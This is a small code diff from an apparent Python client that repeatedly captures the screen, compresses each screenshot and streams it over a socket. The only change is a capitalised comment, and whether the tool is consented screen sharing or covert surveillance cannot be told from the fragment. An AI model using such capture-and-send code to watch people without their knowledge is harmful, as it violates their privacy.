@@ -27,7 +27,7 @@ class client:
 			steam_buffer = io.BytesIO()
 			ImageGrab.grab().save(steam_buffer,'PNG')
 			screenshot = steam_buffer.getvalue()
-			#compress screenshot
+			# Compress screenshot
 			screenshot = zlib.compress(screenshot)
 			sock.sendall(screenshot)
 			time.sleep(0.1)
